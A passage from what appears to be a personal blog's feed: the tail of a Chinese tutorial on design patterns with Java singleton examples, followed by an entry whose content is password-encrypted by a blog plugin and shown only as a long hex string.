class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><p>需要注意的是，为了保证初始化的<strong>线程安全</strong>，InterfaceOutside 类的两个方法都上了锁，且每次都需要判断对象是否存在，这会造成<strong>不可忽视的性能开销</strong>，故通常情况下不会使用懒汉方式来创建单例模式中的对象实例</p><h3 id="饿汉方式"><a href="#饿汉方式" class="headerlink" title="饿汉方式"></a>饿汉方式</h3><p>相比于懒汉方式，饿汉方式会在一开始就将需要用到的实例进行初始化，这种方式便能够直接使用已经生成的对象，而不需要判断对象是否存在</p><p>需要注意的是这种方式无论你在程序中是否需要使用该对象，他都会将该对象进行实例化，这通常会造成额外的开销</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingletonPattern</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Create new InterfaceOutside instance.&quot;</span>);</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line"><span class="type">InterfaceOutside</span> <span class="variable">instance2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InterfaceOutside</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Set val of instance1&quot;</span>);</span><br><span class="line">instance1.setVal(<span class="number">114514</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;Get val of instance2: &quot;</span> + Integer.toString(instance2.getVal()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Create new InterfaceOutside instance.</span><br><span class="line">SimpleObject is created!</span><br><span class="line">Done.</span><br><span class="line">Set val of instance1</span><br><span class="line">Get val of instance2: 114514</span><br></pre></td></tr></table></figure><h2 id="四、建造者模式（Builder-Pattern）"><a href="#四、建造者模式（Builder-Pattern）" class="headerlink" title="四、建造者模式（Builder Pattern）"></a>四、建造者模式（Builder Pattern）</h2><h2 id="五、原型模式"><a href="#五、原型模式" class="headerlink" title="五、原型模式"></a>五、原型模式</h2><h1 id="0x02-结构型模式"><a href="#0x02-结构型模式" class="headerlink" title="0x02.结构型模式"></a>0x02.结构型模式</h1><p>在软件工程中，结构型模式主要关注于<strong>各个元件间的关系</strong>，以此简化设计</p><h2 id="一、适配器模式"><a href="#一、适配器模式" class="headerlink" title="一、适配器模式"></a>一、适配器模式</h2><h2 id="二、装饰器模式"><a href="#二、装饰器模式" class="headerlink" title="二、装饰器模式"></a>二、装饰器模式</h2><h2 id="三、代理模式"><a href="#三、代理模式" class="headerlink" title="三、代理模式"></a>三、代理模式</h2><h2 id="四、外观模式"><a href="#四、外观模式" class="headerlink" title="四、外观模式"></a>四、外观模式</h2><h2 id="五、桥接模式"><a href="#五、桥接模式" class="headerlink" title="五、桥接模式"></a>五、桥接模式</h2><h2 id="六、组合模式"><a href="#六、组合模式" class="headerlink" title="六、组合模式"></a>六、组合模式</h2><h2 id="七、享元模式"><a href="#七、享元模式" class="headerlink" title="七、享元模式"></a>七、享元模式</h2><h1 id="0x03-行为型模式"><a href="#0x03-行为型模式" class="headerlink" title="0x03.行为型模式"></a>0x03.行为型模式</h1><p>创建型模式关注对象如何被创建，结构型模式关注对象间的组织结构，那么我们还缺少什么？从OOP的角度来看，我们似乎还少了一个类的“成员函数”——即对象之间的行为</p><p>在软件工程当中，行为型模式主要关注于对象之间的交流模式并进行实现</p><h2 id="一、策略模式"><a href="#一、策略模式" class="headerlink" title="一、策略模式"></a>一、策略模式</h2><h2 id="二、模板方法"><a href="#二、模板方法" class="headerlink" title="二、模板方法"></a>二、模板方法</h2><h2 id="三、模式观察者模式"><a href="#三、模式观察者模式" class="headerlink" title="三、模式观察者模式"></a>三、模式观察者模式</h2><h2 id="四、迭代子模式"><a href="#四、迭代子模式" class="headerlink" title="四、迭代子模式"></a>四、迭代子模式</h2><h2 id="五、责任链模式"><a href="#五、责任链模式" class="headerlink" title="五、责任链模式"></a>五、责任链模式</h2><h2 id="六、命令模式"><a href="#六、命令模式" class="headerlink" title="六、命令模式"></a>六、命令模式</h2><h2 id="七、备忘录模式"><a href="#七、备忘录模式" class="headerlink" title="七、备忘录模式"></a>七、备忘录模式</h2><h2 id="八、状态模式"><a href="#八、状态模式" class="headerlink" title="八、状态模式"></a>八、状态模式</h2><h2 id="九、访问者模式"><a href="#九、访问者模式" class="headerlink" title="九、访问者模式"></a>九、访问者模式</h2><h2 id="十、中介者模式"><a href="#十、中介者模式" class="headerlink" title="十、中介者模式"></a>十、中介者模式</h2><h2 id="十一、解释器模式"><a href="#十一、解释器模式" class="headerlink" title="十一、解释器模式"></a>十一、解释器模式</h2><h1 id="0x04-并发型模式"><a href="#0x04-并发型模式" class="headerlink" title="0x04.并发型模式"></a>0x04.并发型模式</h1><p>并发型模式主要是随着多线程处理器的不断发展壮大而新出现的一种设计模式，在软件工程中，并发型模式是用来处理多线程编程范式的一类设计模式</p><blockquote><p>to be 🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实👴不会写代码&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="http://blog.arttnba3.cn/categories/CODE/"/>
    
    
    <category term="design pattern" scheme="http://blog.arttnba3.cn/tags/design-pattern/"/>
    
    <category term="设计模式" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x02】Shell之外的往事：深海水母与钻头</title>
    <link href="http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/"/>
    <id>http://blog.arttnba3.cn/2021/12/31/PIECES-0X02-SHELL_OUTSIDE-2-DEEP_INTO_THE_SEA/</id>
    <published>2021-12-30T20:30:52.000Z</published>
    <updated>2022-08-18T17:44:50.446Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="8f2adfa3f9076462f2e37e1fb9fe29e3e1daa5e25ba12776678e796eb0d96747">eef143a3a3e51e2ee0b1e9c84de8c53c9ae7d3e19167c9913280bfaa5b480ce75380276f05b1c7473d4940709ebb324e40c9d1fe866e442b3ca46ca02cb6c70e9e97d2838eb5628d78bb2946acbfa160980a0c5e6db0d178ad5f1573187aa6d210d5dce86476aa5dcf5fa41990d761ea521f041bc020f27294e221eda8d539f6155738117c3faa06feb69d1c0247232be1c10a7d8e5b28321dd148a4d6f23f5ac0ad3ddc7defee7f7d41eed4a68c69b1d633ac1b0dd71f1ca15254fb787a3154bc711dba18c803f96d7813c812d52729ded0e377788a135bc54a56f8dc29a86fafaeab9c5a005401dd6aea8005879ec7322e6fabd1b26819ccbc6b064d2764a9eb80a540ff6b34698f40ddac941d7f471d933e9849f856f935d3d1bd3dc700d88df317f02402d564bc78bc44406e5ec82d16a5d4e3115fe6594f8e7b2365950ed9eee249cb9b054d1201aa52ea0a1ed9931bf4259e5887c53730d5d2b77d59fb31ee0b95751a4d8e36abd7ae271ca5b4b3753f3e8a88a754df370ef352c66b2e281819dd6e9da6186e4531007a7b443b7b9bef0138184d4f5ed5e7fd1cd5894eee01998bebccf1a469424f55d0b637917a5cd59c3e2a30e4476cd6c0a3e807753049327a20f84b47aaf8f092c7612a5c5714d690a6be1f5f986045f3d5db0b912b6b704ba607fb6d9794a37e4c3907a0cbd0bd6ae522401e625487be20706aa54d555588ba8c44d772a44fcc816e552f69470d6dc9e93d9c215cb558e1897b34f19dcd6f89c1221657cce90f15da40d3c6522bd95e41b0d8e299cdb2dc4ff64779943148fdbfc49bfe7a8546370aaa4fbc302200f657402a870dcbe97d89c013ac8e85922d8d3198dd7fbc810edba03e05c94f1252499058a288f30fda96af678d9780359cc40dd6a01c08ae9ed9442514ef652a315949958f490830b74d6bdc664f84400a2d30808b2b81156a339b7148b8d2b5f0955aa6a6bf0629c5e5c4d064870effc9d782ebcb2ad32216aa35403144c0b968d019357f83fdb89136b1f51a4a0f9141db277bfba01d7d235c8f3b0b427aa26d3819f566669d04ff551aa4241ff70905704793e50b266699674b4754b1f98f77f2cbfc491a99c27391dc257318499b55bfad5ffa5d51a133d59a1f821e8fdb0d5d2a4974cc7a693f086f9657d1c8c10afeec425ea2aa55f1ce93696f82e31a121c6c2cff72e30423f58271553e9683000bb29d22aba4039549621e758b4938191c56d56e543d779961a103af16d6225a9b81553460699485c4e9fdcb5dff29918be9652180b347ddec07d8ffee3a0e5db06d7cd25b44973593d2285a12517700db968af9f069d0fdb90d9bdad29c0a657e5b38a6792fc09430c660014c9bb86323ec48e3da218a457cd9af64fd4a6031c612a8b97847235c1277a80b021d510aebe6717d17a0af448403d264b2e71cd3e52c62071cc82624067d59331c029474ff9e83b3b49a125910921129a0ae582d0096ba2a108a8b7e8621a66fa55129fa9fa23d87a0a53d5039c2607b7d5203015cfe32655d846a6e604b43f7365d913fe04a10d645f31cdbfbb3ae41a95b44ba7e7a8808edfc3f0a4412ebbfd69e62ca14f335a980e7c0a483d4bbf866cbec42cf9d337779c8c6a7c47ff1352c5f82ab963b7dca28aa6a64e2e3b0d9819ad6117d37469531ae919c6dc2e19679727547bf3a7a8951a42f820013e3d2eef14e8741dc39f732ba73bd7aab8ce09c9950fd9b7aa1a34a5dcabef8a7b253b3d3bd2e8bb566a58d82501d29b4aad8a5c760b1d7265b7a7041c9106d063cd8599a77be42bde1403574d5f44fd79f3e5c607b36b36802a8170125c3dc199ea2bbec3237054b4b1366eb7d3ec6a4d167b002c1c9ce911ac460e2626f56c3ba1d65ed4396daf4404c147bbe97baab08107b8786c6ab5a58e4e05b21dabc159240191f9b4d41ee66e31089762d020acd42a200cff579c6365e40ed788f5092de5c848b28e7d0968f1d23695c88f26a23de78dce3f34746c3979abdad4c24e25e12440e400fd9ec8c289b583c3f6fe6504990a48c7c9a209e400931b3e0fb63a45e6f522fd84362b70689ddd876d4213e7801aea44d8bc174244baf4570ac9f0f71fb921916c238c958e6bb5c757d8d1b6fdaff549489343ff90497dd5fa550c4bb50e1ab50811624c3fba1b2b54be48eed5ccb9bb34a1d03a0430185aee5b6e8becbf68b4d417eae59ea68b252b1f8dbe4a59906cdfa80636e021ff1852805ce0c2a5358edbd4d1ecffe29b921346037c4d41205de32203249a8dea70072e1af2583ab7e73ef4b7402af06d9f27a6d5b3f433e86bede157f7c35f6b074b75c7c2f21c088f44286e84356db22b7915670ad902f9ba4b7dea3ce59245e876bd31cfeb7ea8e0fb717a63e7171468d98788c01ae5852a1b974ebe7a769af164ee578280246e583e5d646f17da30a51baf24e6971b64c0dcada404a843c4687fbd36d5ad69e6e5e6444b5938f7d913184f7f4914d52f02d09c0bf852589dda105f4c5f1600466bd151f20ed413506dc6afd6593e8ca8fcd6219267dac889faed7b0454fb5d15046a6fcdf2169db4242ff0355ffe2ad504e10d30cf4b8084d74dfb4165a4aeebd6a6fc4397792a3846a38aa7e7d5935321cc438b435ae2b8febedb238b7f227943c2b1c50ec029f51ed34ef488b930a0f2bba4e5eda82ff87efc6f5e673fc7972a15225befdfb5ce0489b374d4538eed4ef80f20d190d0fb5582beeb12e01d365ad7d479a21cd7760231f6055266ef7c4140cb881bd30e8ea9f058124dc4e0cf9dfd234a2fb48a68e2b9d7d439854cc09a9ee720e7208c36351356acebd9e03ba8b50e0d7f5fcbd1f19bb66f5c22aa702155d5b2cd901d9e3909984189372f236b69413b7d0d5e9490323fe0c05db57a01a266d81123b86f3ec3443e0c043b04043aea0c0c017ee7b249d8b9b33544b382dc079e0f117a3473fb020f1c0781e5baf177e64dfb6f2451e54072b966fed655f9831f25f25c47cccc118d0bbdf58297334ef5def36a5a3e630c0ca5b54584e4d400d9a94ce79ab30d2aeaa7a34068b89dc9e085b453320d7bfc17b3549075b9352a7793b1ffe2debd8789f75dcc83ceae8431497612ea1a65750a49aca209c4ad3c2d1c4003b086be5d1e5f0da44f586a68b87ac7fe9b0a3e9cfc388a1f1ad4a09036376fa362d78f8b3cb2c04d7979c36a55c357887fe62b3a37765da428f10524438683387801709d8e219f8fff9c9602fe49e0d221b59e9f2a0a3bb7f32d2e081d2bdb6496986eb2cd1573f748b1db209e0d2a1c3737bbd26f6abcb37c2cc8a29bd18246a6e8ece4175989cd8a831773c14acf1732ad0d009bb22d40782a11bc6df7cfbe105a40e81374f0856137188e4478bd0d10ec6bd528938cc3109b11308ea351a77afd2659a345ab4d9390f0d8cea05896c972f7c768749e4a4db0b16ca28e74166d7dddc3b7f6bdd72550d72bed0e357c8f133d8b25464ad5d345fba6ccc359dbca06144d3e43a9534c60840d719d8ad0ae94675b366654cb209c2e71498291bb6f44a5d1e26e2fa7c487f9250927cb604661ab45283620e192c933a7c1bf8a3e5fab3d03ac482e0b5db9032c849a76b600df969175e9ba041ed33ad39d68b02ffbe3e36f3aea67360ca47fc6e7e82dea15dc7468051c446563cf0dbe7ed8ca473c72d4ed78834881c41ba18f5148697b69682ee2ef14efd757df1b38231a7677cec2141efc295a2117b1b219133a493468bfc3b9c7e4589bb33fce88d9f1bcb9cf606e55b0404ac78e96f86e5363891e0f089400f54b03606525b09bca4d3d7c6e5f1009cc14d85739ec2e3f4f97200f59a67e50af2b9435103b31ff67c4cdb1240433ba26bd04e2d683c3278d0856c1bd743c2678a450ee7aaae11e02aeb9188c531ba293b1f52df426ff20a09e9cddab019827864b56dbad5e114c433c167ee9e3577243be41adad41d315536c08088d34bbdfa5621f5339e027771a1dd9b59f40b469fb83d76e4edd82d4efd5103985f246d856ecd65e24240066b62d2b2a44ef19aa9612fe0c833a831d5474f15775b002daa64507b081f86e6851e1476c50dc6595a2f1a32e548b0e1562df91d572e89e0228f255e61b3569d7f3c126bedfef5f2e66941711a581a80f58d2c1dc7183e071879970b059315295b7a8a3b1a570f809f8c89ee28853125ba8eabff1188dc7e46b82f8a20a82e7860055862564a0fb7392a706d10c4a2bf5ea64e8f92d5338403d00f1a21917d85c214c5eff3aa1411f8618b2ad0ac071fe8109516dfb661f23bb73c36eb39ea0bf6a30792f49e537bcb498d1ec213ac35294775088b08cb3ae6bf80529c4fbfbbc510c4c2f787ab22e943816cd2f5dab0eb9f85e0eb78e394d83711268a54921eb291eb73b5c8e0cbaedf84e450a22167654d80c92679a7627ce78c733c50ec3d34163e3afba3de3c2e17a0fe2eb47616b7a8bae105724908d427a0f069e425a1e48d55f6d2d46c7fe6bea0fed6e3cb7c3ddf30a9880c53a99e3f29ab62a6a6461460c0869abdc9ce734e625903c755d45f176f30ac53182d59a2312874e807ee85d705627a09208ce1536e01fd03c1932d9acf281e72e5c526424037b07168fd9d518b88c1e0a6208c3511fd30dcf711e01443e5afc588d6d4b656d0ee97e27e25655ae2d07297e47642e39b7a54b802b246043d3c698e8cbef3b6e7ab57831e28cf7ded560b7cb3587ba70639bbd3e256c71a59abca99483094ef2ccd49e2e90f7fbca99d896f85641621a89cd36bbb8c280eace4b1351cd461dc2be1124cbe0bd362907da894a7aaa135d8b5d1dbb4135c98e30fee97818217a3003f1c41d1c7afe0b7ece5b034007cab5919917f43e948d42e886afd0a45163774b0b8b621f500306e808769165823e4ec85ffc3a6eab3a50973b2671ab81d2169dc702bba16e9b1318ade868c2661524e74ad9c27053aa789a7b8bb3dc1d255bbaeba321b60d15453de12f565aa349c1697158f8b15cb387d741d861de81bf45b2687de4819294d7a54565a55f04441b046ab7ab606fd8af7614285ea79dafbee43afe691041aad2a089cf436cc1c5ad6d4d9280343a718bfdb1d14a5e1ae7a5366b39219ebeaf80cdacd00fb9646d9550c62400bac48d3d22f5a52a520337cc231396c6894dc48f303e99fa377789985070ad806cb49171e2d494697482a2dc89e1f4fe125511f4a238516fa151d0cdf6bb4d8ac204385a3033ae3a08e70add2ed6ce787781f57e37fe451f1ef39648b97c05d6bc58d2edb0dd8678096f94306e9d1012d3fcb9fad7c1261069068f9db122f2e142f7b9fa9e7aad5cb2fe567d46a13ebd30f32ff0f30a7d5765c9dab82029d5a4eff3bbcf181f822a72094ee119ad479758841d2025859ca73c4131c056edc85b78cf3a826e7f82622aa20da04b0c873d92b337c47efcf6be790e17d4fe5e091b60c25d4bb46c4f36a42d4de0a4eff22b015a0dd656d679878ffae882db29c532b5f38c839872852dc6b88274f7eb30e1e0585b5411131fe993ec18c0ee837d7512df17363a77be149e88240844e5c3366dc7f18478141f675c0ea87352052973bde9bf663656ecb4d2a839ba6f987decdb4493ab7edc87ce12899007af442d83b27e20dc42a83c1202e51df691745b6169a3714453117a95bfab87ad23bb900bce0a090561486a53eacbd9ca6bc37b057fb6945b61ba64108dc1b9ac317e9fd6c120a755133337fa6c79244f1cf49c959df938d5bd099b14f9173324a70cc3dd94d646fe74b242924991231b3420566e8b7b111ce29c62ca655a593360da8716f016ebd8d8d86ca5effa52a1634aab9d9d15d0632c4c39c3c3a4236bded967a4009e83539a77c58019aa25849b5b540352c622485afc8a6bb238828388bbccf30a10051946ac1a86078d28947458b621053012e92fd06abf8fd231632e9f0e7294735ed30abd0cde69ae07e2fcd869d2ab1cb270c4fe65848187938064f3c6f0a26c67e2b0b4175e9967eb07fb189107a44a9af849d9bb6eaa5a7621024964c2c0001a51fcfe24709a19596fe8bd57eeb392ef04d6c9c6b29698dc28498f02b138be9dbc094dd139b4549b74edc3d8b987e73edc677c12a51fdbbcc205bab6740de646afb3fabcc97e10e15b258b1b34452e0c821c854f5424101fc440fc6d229a9d3f14a480f0fa0bec8f7648f08d186bd7e24389a0424e18e713d31d062f4357df8a56084987c6c2bf2891f3e5ede4ad50093d64880963bb82d341e9c5dca06554dd78e1c3857f0084933482345dbdc91bce6f08b977bd0569a7124ec2771dbbf852cdff79c32c1930f56410f4dd5135da92e1947b356d4afa0d2241bca9c6e6dbe94aba42ab621fe5b324f1e8fe9825c028186562ded8a255208a192a0568dae8999bc65ae82e9c6cf3b5e43054526f11b6415eb15588e9495042aa3246e8c756baba5db675d2dae96604be3b7be8fb5fe7d3e87bfae4a143ebf2227dc1c8904752dbd7a5c3d3ace25a6a0753f192c32cdf4b38df560fbb14611d71c277fd3c565b3c3c83179f215e0bcced9d6eed0dd61e5eddc45fe238c2c4ff568b2a01a376d07dde93dbfdacdb4f8c0894a89a1f701720ccbe09fd1a36d3bba59c532b77e48e54eee097de0a5365977c98ef0782739b0aaacb6345256ee00fab04920265f6fbc528d80710158abae5a918d835d0ec480925f4d678f7a4b0ead5402ff14a11e7235893f593997de30e343611e63a2c194958cd61c3b41eead0d77fbfd48cf44615711694f816264d2e7133270d8669ce43032b844e0903ed09bc9cff0d96a48f70780d428e473188f247485654a6f1c7faac12810f8ba3c73bf385b829c32517ff447f9db9cbd9df5946386a38fca6578a818839893d6ec25c277702859e7c0e9bad185c79c6042e9c19b9190ac2d3eb8ad8d3e1c4770ed0f6281bbc1791750039303a2437a84eb15a866f58f3a47ad4245746dbe1f30f8acdb727ede8e1813f563d1bf63f568e9f3165c83635f38f70d78a0dcf883b653b318efa0c538a34aa767b2ce462a43e908a42e984bd14dc51474cf47d4bc310368f42c2bf8e0eb3977d97a0214620e6d80bf1651100be0380d4ef48685a2656cd1309fbfdfeadd3ed9602a6c1beef7c9ecd3c7045d4551d3b464a2e85e14f62ec84e6155e2a5eab4a4dae27c1091d1592005d5da8988cbc4953182b3ab92c5cbef11fef24070e0bfbf41aa4130017f00340ddce379765f1fc4deb67d7d4ddd4697b2e0829e52d22eeb44939212ee6144293e442fdbcec0e072673d48e31b7e9690f875ce9a739c10cbc629aa4a885f9e5ba4b9a2deea46c341e2cbe17f749f82c0b253b614b735d5f496c350a0fa7086eae4df9307be6c503028f1c772bf44e9bf0cec7b89e988550a9c7156ec136c5f770f5259634fdd5ac9c1038ee9655e4b1f9f85b9f04156f077818d848fb459b828dd732d22cf46cbcc3c82b9ee233dc01e880a3f91ff9691b7864832d2017991290c35f4c0205c10e1b51a8135dcb845416bf16bb1aecc8bdb8aaaa24b35cf7b8529a9729a71ca3dcd82f5f79a65fc54c4529164dc7e03f5def192722a991e77060f07566ed2d27497b63041618862493772d02aff20c5ad2016ddf70384bfbab7192adfb2e87365a0cd467f0a4e5c93ec87230765d10caaa5292d398d913eb5b1e71575843ba98c5f530b136581e4206c907ea535492286297a89c7baf21b1456adf423092f2e5ce4fb23158a638c58fd4117cde61011f52a77ff97a148dad32c4353f6dfc7f8fa278bbce72307d0c97a98b2a89a2c276b1d7dbf8ae9a673ae1bb48d1e861ece7f3cb83726ebd9f72b0dd3e75f77faa9aa3eebab4471811e1cd253a718b29a76e4a37580ca413c8a400dc447a2f953bf18f57163163576d801b1cd84654fa276fd485b2a838d6cf2653790ea91a3dfc2a72dac3c5c38e05d4feb7e2b413847aa934411f72502fef3e0626c5ca4e69ef16dd36fe9286c238e13e7f515a8f1aec0967368687b8fe206d1335f6122e0c41844a9569a1b192ee91f8a2b7d9fef472c89321baa951a365686155cf2aa7fe21fb441793fdc50c338c8a4eb72e6d51f1346e80a05fcd6a674f603d4b6c66d17c58bc7c8d013fb2f0d286cb95433e968302b230b63ab84c19d12db5d514ac858429ad1416b86a4877fca924d05cf91e47a471c6065a03697210f7862bf3ec9e96632e08f5df27e0aa491ada5196a9a94f808205c2a14e47f8f2f59b75695cc7c7b786b49d2c0d35cf5daa2733cbf5e838e7db3792fd86d3a5a2fd2c7b49669a1d71112b5e8b8b62a4338dbc503ebdde4f43664bd47714f686f5c3810c29332c46dbd620d91bd56416da62134571c69dba48be586be56131bcc23ae49f2dfcf6005a3a559dc330334dbca12bd862622954d1fb9ef07972fccd39f57f6a2a58549b116b534998c288931a6f204dce2aca84627c212845a4493ccd8695101bc01c0d4fd9fa3d29f5988c249a78738db1e60c9855bfb960612cff69c14a34d8e4a8f046aadb63a5feb08d1be7e2134bcc9749bc4d4262f6d2123e9b2c6c9044e46115875a6a79d5af6f61b8f49f3cb9978bc09e9c1c3f49d9562a620a128f56c623881fd9e07ba9e20c70b528948a3a9f00123d873658e52d1658bb7ee3d8b14723de60d0cecd438f7d208a7d29f5e38d9c5fdce6c0a02c6f9f9eb2346f630d02a0716eb129fd31d03397a3e071bb48370c388bf10aed51184bd704b1de2d9378b49965f237ec5a28d114be83430519e40b618ca3f927c891f692bb96b11a037ffd328aa25960629615e3ff47f269ca0ed12105cd88052a1728f212afc1851ff4ce657da9c29fa5983a840d9cb72060a2f45bcb7ff783077a3eb5e29213916140ef0ff15cb6433f6abf4e58caa59c9731fa2b57a4c04029d3317929d5891cdf5e1b4f77dcde29a9e0e424580f83a613daebd6c7ba04ff48d77cb0379838dd89cddf67228d7e24d4a6f2df4c22491e55233f327cc29cd6453dad808970e6b5948f125f9b360cae921429c44daeec3f76538f864a5fbde92467d7dc3cd9747d66014e2997f1bc95511489e51dc6be17d22b454de353da0b46bddd88b421f6a14a56840be6e626c3eff1afd610e4eb4ee2a2aac578cbd97467dd87ed53e19610d07ada0552e0a07deb04accc007ce4fb41f88eff75508b7c858d19ed6728ba0791aab16b37c9ab54fa44801204a42e2cd3e9364b9cc9b6b33c2ab83093f39955def4b5dd4ccf05417bc8d440bd6df2f9cdcebc85ce462cfa6e0e567c7939d6833fba839f9108aaefcaa10d31bd19a609251d0133bb9f910b399838504df8fe51bae6346c8a4f827797fdc47dd649f5b145b180a183f120303fe8f51c4f04146280042561be5f4bd4f769e32322b7d45ec8ae6851cdb230a2378255d2e9c50adebbea4bf12097f6b9ec821b907155d934aa711fb6adfa9bc552549126716899de9727d2e2adde3f62c7a1774e60028fc355fab2dff76161a032f96fc4a4a8668c341c098681b1e47d11bae31b57b20e44cd6e32a9d18f4df7b7c9a1d69f33211b7578a75147ac4aa11df004ef861739208e67a700bffe8e141e50f70f6ed61d016b43e0baefdd34bf19bdac19e4feb61755a9b3c5f2420712c57978d366b0ba8b9c01ea7f32ca31c1d5f08781eb0a7a08772e54eac7e12874e564d698ed3144d38809e68755928a424c8a4ebd7a84eacc7dccb35b25415159d79c7f0a65861caf989e27118a87bf12b989e1e4644f98a85999488fdee0dfd916044a2d704ddcd24a777bdbc2ac1d6b314e682a5ec7933f3f128841c39a09fa546140c4d9b09bcb662672bd497ff14976db9e57ba200c08a440f1a8ba233277183c423de7d945ca5babe581d99975ede33a1b4450ee8dcd8a65d7256b1cf931f8bd8baf6ae580ef9a3426beb5c0188e615288a480d58ad8d90bb4fd6d56efd8877cd60383d